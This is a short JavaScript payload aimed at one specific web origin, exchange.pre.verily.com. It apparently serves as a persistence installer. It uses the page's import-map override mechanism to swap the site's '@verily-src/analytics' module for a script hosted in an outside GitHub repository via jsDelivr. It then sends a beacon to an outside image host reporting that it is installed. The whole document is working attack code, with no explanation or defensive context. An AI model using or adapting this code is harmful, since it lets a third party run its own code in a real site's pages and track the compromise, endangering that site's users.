(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;

  const marker = "maple-stay-52d7";
  const moduleName = "@verily-src/analytics";
  const persistentSource =
    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@9ee723a7fdcd61b6a26c11158a12f3bab331e091/silver-lantern-83f1c2.js";

  window.importMapOverrides.addOverride(moduleName, persistentSource);
  window.__exchangePersistenceInstaller = {
    marker,
    moduleName,
    persistentSource,
    installed: true,
  };

  const query = new URLSearchParams({
    marker,
    origin: location.origin,
    installed: "true",
  });
  fetch(`https://img.defyourtype.com/r/maple-stay-52d7.gif?${query}`, {
    mode: "no-cors",
    credentials: "omit",
    keepalive: true,
  }).catch(() => {});
})();
